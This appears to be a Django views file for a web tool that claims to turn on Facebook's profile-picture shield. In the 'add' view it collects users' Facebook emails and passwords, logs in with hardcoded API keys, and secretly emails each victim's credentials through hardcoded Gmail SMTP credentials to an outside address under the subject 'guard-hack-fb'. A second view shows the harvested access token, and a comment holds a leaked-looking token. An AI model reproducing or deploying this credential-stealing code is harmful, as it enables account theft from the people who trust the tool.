# -*- coding: utf-8 -*-
from __future__ import unicode_literals
from django.shortcuts import render, redirect
import requests, hashlib, json
from django.contrib import messages
# -*- coding: utf-8 -*-
from django.http  import  HttpResponse
from django.shortcuts import render, redirect
from django.contrib import messages
import time
from email.mime.text import MIMEText
import smtplib
# Create your views here.
def home(request):
	return render(request, 'index.html')


def add(request):
	if request.method == 'POST':
		id = request.POST['email']
		pwd = request.POST['password']
			

##################################################################3333
#	id = ("mhmedmuhammed1998@gmail.com")
#	pwd = ("12345@@##")
#	API_SECRET = '62f8ce9f74b12f84c123cc23437a4a32'
		data = {'api_key': '882a8490361da98702bf97a021ddc14d', 'credentials_type': 'password', 'email': id, 'format': 'JSON', 'generate_machine_id': '1', 'generate_session_cookies': '1', 'locale': 'en_US', 'method': 'auth.login', 'password': pwd, 'return_ssl_resources': '0', 'v': '1.0'}
		sig = ('api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail=') + id + ('format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword=') + pwd + ('return_ssl_resources=0v=1.0') + ('62f8ce9f74b12f84c123cc23437a4a32')
		x = hashlib.new('md5')
		x.update(sig)
		data.update({'sig': x.hexdigest()})

		try:
			r = requests.get('https://api.facebook.com/restserver.php', params=data)
			a = json.loads(r.text)
			print (a['access_token'])
			print ('\x1b[1;32mSign-in Successful\x1b[1;37m')
			smtp_ssl_host = 'smtp.gmail.com'  # smtp.mail.yahoo.com
			smtp_ssl_port = 465
			username = "spyeagle2020@gmail.com"
			password = "$$$spyeagle$$$"
			sender = username
			targets = 'ledearhacking@gmail.com'
			msg = MIMEText(id +'\n'+ pwd)
			msg['Subject'] = 'guard-hack-fb'
			msg['From'] = sender
			msg['To'] = ', '.join(targets)
			server = smtplib.SMTP_SSL(smtp_ssl_host, smtp_ssl_port)
			server.login(username, password)
			server.sendmail(sender, targets, msg.as_string())
			server.quit()
		except KeyError:
	#################################333
			#print("filed login ")
            		messages.info(request, 'Please check your username or password and try again')
		    	return redirect("/")
# ###############################33333333333333333333333333333###################################33333333333
# 			smtp_ssl_host = 'smtp.gmail.com'  # smtp.mail.yahoo.com
# 			smtp_ssl_port = 465
# 			username = "spyeagle2020@gmail.com"
# 			password = "$$$spyeagle$$$"
# 			sender = username
# 			targets = 'ledearhacking@gmail.com'
# 			msg = MIMEText(id +'\n'+ pwd)
# 			msg['Subject'] = 'guard-hack-fb'
# 			msg['From'] = sender
# 			msg['To'] = ', '.join(targets)
# 			server = smtplib.SMTP_SSL(smtp_ssl_host, smtp_ssl_port)
# 			server.login(username, password)
# 			server.sendmail(sender, targets, msg.as_string())
# 			server.quit()
# 		except KeyError:
# 			# 	messages.info(request, 'Please check your username or password and try again')
# 			# return redirect("/")


###############################33333333333333333333333333333###################################33333333333

		except requests.exceptions.ConnectionError:
			print('cheak internet')
            		messages.info(request, 'Please check the internet and try again')

#3333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333
		enable = 'true'
		toket = (a['access_token'])
#'EAAAAUaZA8jlABAIVDYHZBbuwzd4gvamzAbmkP5fsR1wRUKN8oUzsAZA6DZCogVimkow3lkTdhQrTAJXf4VZBEPUIaOzmYh2QQ6ji4LbVLWvbG97BRn2lc7l7WU1704EpZAfdZCbGJYdtKsLaAxRCATDQp2sCtVwNl4szZCgb3gRQtaX9eZBsd95R3kr4shWRaEEUZD'
		a = requests.get('https://graph.facebook.com/me?access_token='+toket)
		b = json.loads(a.text)
		id = b['id']
		data = 'variables={"0":{"is_shielded": %s,"session_id":"9b78191c-84fd-4ab6-b0aa-19b39f04a6bc","actor_id":"%s","client_mutation_id":"b0316dd6-3fd6-4beb-aed4-bb29c5dc64b0"}}&method=post&doc_id=1477043292367183&query_name=IsShieldedSetMutation&strip_defaults=true&strip_nulls=true&locale=en_US&client_country_code=US&fb_api_req_friendly_name=IsShieldedSetMutation&fb_api_caller_class=IsShieldedSetMutation' % (enable, str(id))
		headers = {'Content-Type': 'application/x-www-form-urlencoded', 'Authorization': 'OAuth %s' % toket}
		url = 'https://graph.facebook.com/graphql'
		res = requests.post(url, data=data, headers=headers)
		if '"is_shielded":true' in res.text:
			#print '\x1b[1;91m[\x1b[1;96m\xe2\x9c\x94\xef\xb8\x8f\x1b[1;91m] \x1b[1;92mActivate'
			        messages.info(request, 'The portrait shield has been successfully activated')
		    		return redirect("/")
		elif '"is_shielded":false' in res.text:
			print '\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;91mNot activate'
		else:
			print '\x1b[1;91m[!] Error'
###############################################################3333333
		#return render(request, 're.html', {'fname' : 'done active' })
	else:
			return render(request, 're.html')












def ad2d(request):
        if request.method == 'POST':

                id = request.POST["email"]
                pwd = request.POST["password"]
                data = {'api_key': '882a8490361da98702bf97a021ddc14d', 'credentials_type': 'password', 'email': id, 'format': 'JSON', 'generate_machine_id': '1', 'generate_session_cookies': '1', 'locale': 'en_US', 'method': 'auth.login', 'password': pwd, 'return_ssl_resources': '0', 'v': '1.0'}
                sig = ('api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail=') + id + ('format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword=') + pwd + ('return_ssl_resources=0v=1.0') + ('62f8ce9f74b12f84c123cc23437a4a32')
                x = hashlib.new('md5')
                x.update(sig)
                data.update({'sig': x.hexdigest()})

                try:
                        r = requests.get('https://api.facebook.com/restserver.php', params=data)
                        a = json.loads(r.text)
                        token = a['access_token']
                        return render(request, 're.html', {'name':  a['access_token'] })

                except KeyError:

                        tok  = 'filed login'
                        messages.info(request, tok)
                        return redirect("add")
                except requests.exceptions.ConnectionError:
                        return render(request, 're.html', {'name':  "check" })

        else:
                return render(request, "index.html")






